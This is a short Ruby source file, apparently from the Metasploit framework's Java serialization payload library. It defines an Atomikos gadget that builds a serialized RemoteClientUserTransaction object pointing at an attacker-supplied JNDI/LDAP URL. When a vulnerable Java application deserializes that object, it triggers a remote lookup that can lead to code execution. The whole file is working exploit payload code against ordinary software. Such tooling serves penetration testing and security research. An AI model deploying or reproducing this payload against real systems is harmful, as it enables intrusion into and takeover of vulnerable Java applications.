# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class Atomikos
          def self.make_jta(jndiUrl)
            cl = Model::JavaObject.new('Lcom/atomikos/icatch/jta/RemoteClientUserTransaction;', 
                                       'providerUrl_' => jndiUrl,
                                       'name_' => jndiUrl,
                                       'initialContextFactory_' => 'com.sun.jndi.ldap.LdapCtxFactory')
            Util.make_tostring(cl)
          end
        end
      end
    end
  end
end
